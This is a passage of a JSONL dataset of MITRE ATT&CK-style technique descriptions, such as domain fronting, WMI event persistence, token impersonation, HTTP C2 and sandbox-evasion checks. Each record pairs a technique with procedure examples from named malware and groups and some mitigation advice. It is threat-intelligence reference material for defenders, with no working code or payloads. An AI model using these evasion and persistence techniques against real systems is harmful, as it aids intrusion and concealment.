"is_subtechnique": false}
{"text": " Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.", "idx": "https://attack.mitre.org/techniques/T1025", "title": "Data from Removable Media", "entity": "Data from Removable Media", "entity_type": "techniques", "entity_context": ["Crutch can monitor removable drives and exfiltrate files matching a given extension list.", "Once a removable media device is inserted back into the first victim, USBStealer collects data from it that was exfiltrated from a second victim.", "Ramsay can collect data from removable media and stage it for exfiltration.\t", "InvisiMole can collect jpeg files from connected MTP devices.", "CosmicDuke steals user files from removable media with file extensions and keywords that match a predefined list.", "Prikormka contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.", "Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted.", "TajMahal has the ability to steal written CD images and files of interest from previously connected removable drives when they become available again.", "Turla RPC backdoors can collect files from USB thumb drives.", "Rover searches for files on attached removable drives based on a predefined list of file extensions every five seconds.", "GravityRAT steals files based on an extension list if a USB drive is connected to the system.", "ObliqueRAT has the ability to extract data from removable devices connected to the endpoint.", "BADNEWS copies files with certain extensions from USB devices to\na predefined directory.", "Crimson contains a module to collect data from removable drives.", "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by SPACESHIP.", "Aria-body has the ability to collect data from USB devices.", "Machete can find, encrypt, and upload files from fixed and removable drives. ", "Remsec has a package that collects documents from any inserted USB sticks.", "An APT28 backdoor may collect the entire contents of an inserted USB device.", "A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.", "Explosive can scan all .exe files located in the USB drive. ", "AppleSeed can find and collect data from removable media devices."], "is_subtechnique": false}
{"text": " Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored). For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.", "idx": "https://attack.mitre.org/techniques/T1090/004", "title": "Domain Fronting", "entity": "Domain Fronting", "entity_type": "techniques", "entity_context": ["meek uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination.", "APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.", "Cobalt Strike has the ability to accept a value for HTTP Host Header to enable domain fronting.", "SMOKEDHAM has used a fronted domain to obfuscate its hard-coded C2 server domain.", "If it is possible to inspect HTTPS traffic, the captures can be analyzed for connections that appear to be domain fronting."], "is_subtechnique": true}
{"text": " Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA). Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.", "idx": "https://attack.mitre.org/techniques/T1587/003", "title": "Digital Certificates", "entity": "Digital Certificates", "entity_type": "techniques", "entity_context": ["APT29 has created self-signed digital certificates to enable mutual TLS authentication for malware.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "PROMETHIUM has created self-signed digital certificates for use in HTTPS C2 traffic."], "is_subtechnique": true}
{"text": " Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves. On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file. To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it. This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.", "idx": "https://attack.mitre.org/techniques/T1601", "title": "Modify System Image", "entity": "Modify System Image", "entity_type": "techniques", "entity_context": ["Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. ", "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints.", "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.", "Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. ", "Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. ", "Refer to NIST guidelines when creating password policies. "], "is_subtechnique": false}
{"text": " Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts. Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers. In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox) Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user", "idx": "https://attack.mitre.org/techniques/T1608/004", "title": "Drive-by Target", "entity": "Drive-by Target", "entity_type": "techniques", "entity_context": ["Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.", "APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update."], "is_subtechnique": true}
{"text": " Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. (Citation: Mandiant M-Trends 2015) Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription. (Citation: Dell WMI Persistence) (Citation: Microsoft MOF May 2018) WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.", "idx": "https://attack.mitre.org/techniques/T1546/003", "title": "Windows Management Instrumentation Event Subscription", "entity": "Windows Management Instrumentation Event Subscription", "entity_type": "techniques", "entity_context": ["PoshC2 has the ability to persist on a system using WMI events.", "POSHSPY uses a WMI event subscription to establish persistence.", "POWERTON can use WMI for persistence.", "FIN8 has used WMI event subscriptions for persistence.", "Turla has used WMI event filters and consumers to establish persistence.", "APT29 has used WMI event subscriptions for persistence.", "By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI.", "SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent malware from abusing WMI to attain persistence.", "adbupd can use a WMI script to achieve persistence.", "Prevent credential overlap across systems of administrator and privileged accounts.", "RegDuke can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started.", "APT33 has attempted to use WMI event subscriptions to establish persistence on compromised hosts.", "Leviathan has used WMI for persistence.", "Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.", "Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence."], "is_subtechnique": true}
{"text": " Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.", "idx": "https://attack.mitre.org/techniques/T1134/003", "title": "Make and Impersonate Token", "entity": "Make and Impersonate Token", "entity_type": "techniques", "entity_context": ["An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.  ", "Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object.  Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>.", "Cobalt Strike can make tokens from known credentials."], "is_subtechnique": true}
{"text": " Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "idx": "https://attack.mitre.org/techniques/T1071/001", "title": "Web Protocols", "entity": "Web Protocols", "entity_type": "techniques", "entity_context": ["One variant of CloudDuke uses HTTP and HTTPS for C2.", "Turla has used HTTP and HTTPS for C2 communications.", "The Regin malware platform supports many standard protocols, including HTTP and HTTPS.", "Taidoor has used HTTP GET and POST requests for C2.", "Gazer communicates with its C2 servers over HTTP.", "ZLib communicates over HTTP for C2.", "PolyglotDuke has has used HTTP GET requests in C2 communications.", "SMOKEDHAM has communicated with its C2 servers via HTTPS and HTTP POST requests.", "FatDuke can be controlled via a custom C2 protocol over HTTP.", "xCaon has communicated with the C2 server by sending POST requests over HTTP. ", "Ramsay has used HTTP for C2.", "TSCookie can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.", "Sys10 uses HTTP for C2.", "AppleJeus has sent data to its C2 server via <code>POST</code> requests.", "DealersChoice uses HTTP for communication with the C2 server.", "Kazuar uses HTTP and HTTPS to communicate with the C2 server. Kazuar can also act as a webserver and listen for inbound HTTP requests through an exposed API.", "ServHelper uses HTTP for C2.", "ZxShell has used HTTP for C2 connections. ", "RDAT can use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API.", "DEATHRANSOM can use HTTPS to download files.", "APT19 used HTTP for C2 communications. APT19 also used an HTTP malware variant to communicate over HTTP for C2.", "PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.", "Remexi uses BITSAdmin to communicate with the C2 server over HTTP.", "SUPERNOVA had to receive an HTTP GET request containing a specific set of parameters in order to execute.", "Threat Group-3390 malware has used HTTP for C2.", "BUBBLEWRAP can communicate using HTTP or HTTPS.", "PinchDuke transfers files from the compromised host via HTTP or HTTPS to a C2 server.", "Mustang Panda has communicated with its C2 via HTTP POST requests.", "TA551 has used HTTP for C2 communications.", "HyperBro has used HTTPS for C2 communications.", "BRONZE BUTLER malware has used HTTP for C2.", "QUADAGENT uses HTTPS and HTTP for C2 communications.", "QakBot has the ability to use HTTP and HTTPS in communication with C2 servers.", "KGH_SPY can send data to C2 with HTTP POST requests.", "Wizard Spider has used HTTP for network communications.", "Sibot communicated with its C2 server via HTTP GET requests.", "EvilBunny has executed C2 commands directly via HTTP.", "BoomBox has used HTTP POST requests for C2.", "UBoatRAT has used HTTP for C2 communications.", "MuddyWater has used HTTP for C2 communications.", "PLEAD has used HTTP for communications with command and control (C2) servers.", "Higaisa used HTTP and HTTPS to send data back to its C2 server.", "Explosive has used HTTP for communication.", "POWRUNER can use HTTP for C2 communications.", "3PARA RAT uses HTTP for command and control.", "Lazarus Group malware has conducted C2 over HTTP and HTTPS.", "Felismus uses HTTP for C2.", "Vasport creates a backdoor by making a connection using a HTTP POST.", "MiniDuke uses HTTP and HTTPS for command and control.", "Some Reaver variants use HTTP for C2.", "Bisonal uses HTTP for C2 communications.", "PUNCHBUGGY enables remote interaction and can obtain additional code over HTTPS GET and POST requests.", "OwaAuth uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.", "AppleSeed has the ability to communicate with C2 over HTTP.", "Night Dragon has used HTTP for C2.", "Sidewinder has used HTTP in C2 communications.", "LiteDuke can use HTTP GET requests in C2 communications.", "RainyDay can use HTTP in C2 communications.", "Egregor has communicated with its C2 servers via HTTPS protocol.", "Industroyer’s main backdoor connected to a remote C2 server using HTTPS.", "ZeroT has used HTTP for C2.", "CSPY Downloader can use GET requests to download additional payloads from C2.", "BLUELIGHT can use HTTP/S for C2 using the Microsoft Graph API. ", "DownPaper communicates to its C2 server over HTTP.", "YAHOYAH uses HTTP for C2.", "SideTwist has used HTTP GET and POST requests over port 443 for C2.", "Lokibot has used HTTP for C2 communications. ", "Gold Dragon uses HTTP for communication to the control servers.", "A Gamaredon Group file stealer can communicate over HTTP for C2.", "VBShower has attempted to obtain a VBS script from command and control (C2) nodes over HTTP.", "Hi-Zor communicates with its C2 server over HTTPS.", "LookBack’s C2 proxy tool sends data to a C2 server over HTTP.", "NOKKI has used HTTP for C2 communications.", "The \"Uploader\" variant of HAMMERTOSS visits a hard-coded server over HTTP/S to download the images HAMMERTOSS uses to receive commands.", "Windshift has used tools that communicate with C2 over HTTP.", "StrongPity can use HTTP and HTTPS in C2 communications.", "OilRig has used HTTP for C2.", "MarkiRAT can initiate communication over HTTP/HTTPS for its C2 server.", "GoldFinder has used HTTP for C2.", "Elise communicates over HTTP or HTTPS for C2.", "Psylo uses HTTPS for C2.", "Magic Hound malware has used HTTP for C2.", "Ke3chang malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.", "APT12 has used RIPTIDE, a RAT that uses HTTP to communicate.", "Dacls can use HTTPS in C2 communications.", "FlawedAmmyy has used HTTP for C2.", "Smoke Loader uses HTTP for C2.", "Dridex has used POST requests and HTTPS for C2 communications.", "Ixeshe uses HTTP for command and control.", "Cardinal RAT is downloaded using HTTP over port 443.", "FELIXROOT uses HTTP and HTTPS to communicate with the C2 server.", "RedLeaves can communicate to its C2 over HTTP and HTTPS if directed.", "Avenger has the ability to use HTTP in communication with C2.", "ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.", "China Chopper's server component executes code sent via HTTP POST commands.", "RGDoor uses HTTP for C2 communications.", "REvil has used HTTP and HTTPS in communication with C2.", "Ursnif has used HTTPS for C2.", "Metamorfo has used HTTP for C2. ", "GreyEnergy uses HTTP and HTTPS for C2 communications.", "SUNBURST communicated via HTTP GET or HTTP POST requests to third party servers for C2.", "Spark has used HTTP POST requests to communicate with its C2 server to receive commands. ", "Dark Caracal's version of Bandook communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”.", "njRAT has used HTTP for C2 communications.", "BlackMould can send commands to C2 in the body of HTTP POST requests.", "FIN4 has used HTTP POST requests to transmit data.", "LOWBALL command and control occurs via HTTPS over port 443.", "OopsIE uses HTTP for C2 communications.", "Bundlore uses HTTP requests for C2.", "OnionDuke uses HTTP and HTTPS for C2.", "VERMIN uses HTTP for C2 communications.", "APT38 used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.", "ShimRatReporter communicated over HTTP with preconfigured C2 servers.", "Pteranodon can use HTTP for C2.", "TA505 has used HTTP to communiate with C2 nodes.", "pngdowner uses HTTP for command and control.", "RTM has initiated connections to external domains using HTTPS.\t", "BBK has the ability to use HTTP in communications with C2.", "Zeus Panda uses HTTP for C2 communications.", "Cobalt Group has used HTTPS for C2.", "APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.", "BLINDINGCAN has used HTTPS over port 443 for command and control.", "Keydnap uses HTTPS for command and control.", "Carberp has connected to C2 servers via HTTP.", "POWERTON has used HTTP/HTTPS for C2 traffic.", "Bankshot uses HTTP for command and control communication.", " Sliver has the ability to support C2 communications over HTTP/S.", "ADVSTORESHELL connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.", "Dyre uses HTTPS for C2 communications.\t ", "Xbash uses HTTP for C2 communications.", "WinMM uses HTTP for C2.", "TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.", "MacSpy uses HTTP for command and control.", "GuLoader can use HTTP to retrieve additional binaries.", "Valak has used HTTP in communications with C2.", "NETWIRE has the ability to communicate over HTTP.", "ShimRat communicated over HTTP and HTTPS with C2 servers.", "Proxysvc uses HTTP over SSL to communicate commands with the control server.", "BackConfig has the ability to use HTTPS for C2 communiations.", "WellMess can use HTTP and HTTPS in C2 communications.", "InvisiMole uses HTTP for C2 communications.", "Epic uses HTTP and HTTPS for C2 communications.", "httpclient uses HTTP for command and control.", "Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP.\t", "UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers.", "Emissary uses HTTP or HTTPS for C2.", "HAFNIUM has used open-source C2 frameworks, including Covenant.", "GeminiDuke uses HTTP and HTTPS for command and control.", "OSX_OCEANLOTUS.D can use HTTP POST and GET requests to send and receive C2 information.", "PoshC2 can use protocols like HTTP/HTTPS for command and control traffic.", "Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.", "GravityRAT uses HTTP for C2.", "Tropic Trooper has used HTTP in communication with the C2.", "Inception has used HTTP, HTTPS, and WebDav in network communications.", "Kinsing has communicated with C2 over HTTP.", "JHUHUGIT variants have communicated with C2 servers over HTTP and HTTPS.", "Bazar can use HTTP and HTTPS over ports 80 and 443 in C2 communications.", "Get2 has the ability to use HTTP to send information collected from an infected host to C2.", "APT18 uses HTTP for C2 communications.", "Doki has communicated with C2 over HTTPS.", "Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.", "WIRTE has used HTTP for network communication.\t", "Orangeworm has used HTTP for C2.", "ELMER uses HTTP for command and control.", "Rocke has executed wget and curl commands to Pastebin over the HTTPS protocol.", "SeaDuke uses HTTP and HTTPS for C2.", "ROKRAT use HTTPS for all command and control communication methods.", "Maze has communicated to hard-coded IP addresses via HTTP.", "SNUGRIDE communicates with its C2 server over HTTP.", "CORESHELL can communicate over HTTP for C2.", "SilverTerrier uses HTTP for C2 communications.\t", "Mis-Type network traffic can communicate over HTTP.", "Chimera has used HTTPS for C2 communications.", "Octopus has used HTTP GET and POST requests for C2 communications.", "Dipsind uses HTTP for C2.", "The Komplex C2 channel uses HTTP POST requests.", "The Carbanak malware communicates to its command server using HTTP with an encrypted payload.", "Zebrocy uses HTTP for C2.", "Final1stspy uses HTTP for C2.", "Agent Tesla has used HTTP for C2 communications.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ", "RATANKBA uses HTTP/HTTPS for command and control communication.", "Drovorub can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.", "GrimAgent has the ability to use HTTP for C2 communications.", "WindTail has the ability to use HTTP for C2 communications.", "MCMD can use HTTPS in communication with C2 web servers.", "APT37 uses HTTPS to conceal C2 communications.", "Remsec is capable of using HTTP and HTTPS for C2.", "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.", "Chaes has used HTTP for C2 communications.", "BlackEnergy communicates with its C2 server over HTTP.", "Seasalt uses HTTP for C2 communications.", "Helminth can use HTTP for C2.", "Goopy has the ability to communicate with its C2 over HTTP.\t", "OLDBAIT can use HTTP for C2.", "Sakula uses HTTP for C2.", "IcedID has used HTTPS in communications with C2.", "SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C server. ", "Out1 can use HTTP and HTTPS in communications with remote hosts.", "Peppy can use HTTP to communicate with C2.", "Carbon can use HTTP in C2 communications.", "SLOTHFULMEDIA has used HTTP and HTTPS for C2 communications.", "down_new has the ability to use HTTP in C2 communications.", "TeamTNT has the curl command to send credentials over HTTP and download new software. TeamTNT has also used a custom user agent HTTP header in shell scripts.", "Comnie uses HTTP for C2 communication.", "Various implementations of CHOPSTICK communicate with C2 over HTTP.", "ABK has the ability to use HTTP in communications with C2.", "More_eggs uses HTTPS for C2.", "Trojan.Karagany can communicate with C2 via HTTP POST requests.", "Empire can conduct command and control over protocols like HTTP and HTTPS.", "ComRAT has used HTTP requests for command and control.", "DarkComet can use HTTP for C2 communications.", "HTTPBrowser has used HTTP and HTTPS for command and control.", "Hikit has used HTTP for C2.", "BADNEWS establishes a backdoor over HTTP.", "Machete uses HTTP for Command & Control.", "APT29 has used HTTP for C2 and data exfiltration.", "BadPatch uses HTTP for C2.", "APT39 has used HTTP in communications with C2.", "VaporRage can use HTTP to download shellcode from compromised websites.", "CozyCar's main method of communicating with its C2 servers is using HTTP or HTTPS.", "BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.", "FIN8 has used HTTPS for command and control.", "Aria-body has used HTTP in C2 communications.", "ThiefQuest uploads files via unencrypted HTTP. ", "APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. ", "Micropsia uses HTTP and HTTPS for C2 network communications.", "Crutch has conducted C2 communications with a Dropbox account using the HTTP API.", "Anchor has used HTTP and HTTPS in C2 communications.", "Grandoreiro has the ability to use HTTP in C2 communications.", "P.A.S. Webshell can issue commands via HTTP POST.", "Okrum uses HTTP for communication with its C2.", "PlugX can be configured to use HTTP for command and control.", "Daserf uses HTTP for C2.", "Exaramel for Linux uses HTTPS for C2 communications.", "Stuxnet uses HTTP to communicate with a command and control server. ", "SoreFang can use HTTP in C2 communications.", "Pupy can communicate over HTTP for C2.", "Crimson can use a HTTP GET request to download its final payload.", "PoetRAT has used HTTP and HTTPs for C2 communications.", "Rancor has used HTTP for C2.", "BACKSPACE uses HTTP as a transport to communicate with its command server.", "Pony has sent collected information to the C2 via HTTP POST request.\t", "Winnti for Linux has used HTTP in outbound communications.", "Shamoon has used HTTP for C2.", "GoldenSpy has used the Ryeol HTTP Client to facilitate HTTP internet communication.", "4H RAT uses HTTP for command and control.", "GoldMax has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.", "KONNI has used HTTP for C2.", "ShadowPad communicates over HTTP to retrieve a string that is decoded into a C2 server URL.", "HAWKBALL has used HTTP to communicate with a single hard-coded C2 server.", "DustySky has used both HTTP and HTTPS for C2.", "CosmicDuke can use HTTP or HTTPS for command and control to hard-coded C2 servers.", "MechaFlounder has the ability to use HTTP in communication with C2.", "S-Type uses HTTP for C2.", "Rising Sun has used HTTP for command and control.", "Stealth Falcon malware communicates with its C2 server via HTTPS.", "Turian has the ability to use HTTP for its C2.", "APT33 has used HTTP for command and control."], "is_subtechnique": true}
{"text": " Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness) Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive", "idx": "https://attack.mitre.org/techniques/T1497/001", "title": "System Checks", "entity": "System Checks", "entity_type": "techniques", "entity_context": ["Dyre can detect sandbox analysis environments by inspecting the process list and Registry.", "Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.", "NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.", "RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment. ", "OSX_OCEANLOTUS.D has variants that check a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as <code>sysctl hw.model</code>.", "Attor can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.", "PoetRAT checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of \"License.txt\" and exiting.", "Smoke Loader scans processes to perform anti-VM checks. ", "ObliqueRAT can halt execution if it identifies processes belonging to virtual machine software or analysis tools.", "Grandoreiro can detect VMWare via its I/O port and Virtual PC via the <code>vpcext</code> instruction.", "UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine.", "BLUELIGHT can check to see if the infected machine has VM tools running.", "Pupy has a module that checks a number of indicators on the system to determine if its running on a virtual machine.", "Astaroth can check for Windows product ID's used by sandboxes and usernames and disk serial numbers associated with analyst environments.", "GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call <code>EnumWindows</code>, and checking for Qemu guest agent.", "WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.", "OilRig has used macros to verify if a mouse is connected to a compromised machine.", "ROKRAT checks for sandboxing libraries.", "Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected.", "SynAck checks its directory location in an attempt to avoid launching in a sandbox.", "BadPatch attempts to detect if it is being run in a Virtual Machine (VM) using a WMI query for disk drive name, BIOS, and motherboard information. ", "GravityRAT uses WMI to check the BIOS and manufacturer information for strings like \"VMWare\", \"Virtual\", and \"XEN\" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment. ", "PlugX checks if VMware tools is running in the background by searching for any process named \"vmtoolsd\". ", "Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.", "SodaMaster can check for the presence of the Registry key <code>HKEY_CLASSES_ROOT\\\\Applications\\\\VMwareHostOpen.exe</code> before proceeding to its main functionality.\t ", "FinFisher obtains the hardware device list and checks if the MD5 of the vendor ID is equal to a predefined list in order to check for sandbox/virtualized environments.", "Remcos searches for Sandboxie and VMware on the system.", "QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.", "Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with <code>.Md5.exe</code>, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries.", "Evilnum has used a component called TerraLoader to check certain hardware and file information to detect sandboxed environments. ", "InvisiMole can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.", "P8RAT can check the compromised host for processes associated with VMware or VirtualBox environments.", "MegaCortex has checked the number of CPUs in the system to avoid being run in a sandbox or emulator. ", "ThiefQuest uses a function named <code>is_debugging</code> to perform anti-debugging logic. The function invokes <code>sysctl</code> checking the returned value of <code>P_TRACED</code>. ThiefQuest also calls <code>ptrace</code> with the <code>PTRACE_DENY_ATTACH</code> flag to prevent debugging.  ", "yty has some basic anti-sandbox detection that tries to detect Virtual PC, Sandboxie, and VMware. ", "OopsIE performs several anti-VM and sandbox checks on the victim's machine. One technique the group has used was to perform a WMI query <code>SELECT * FROM 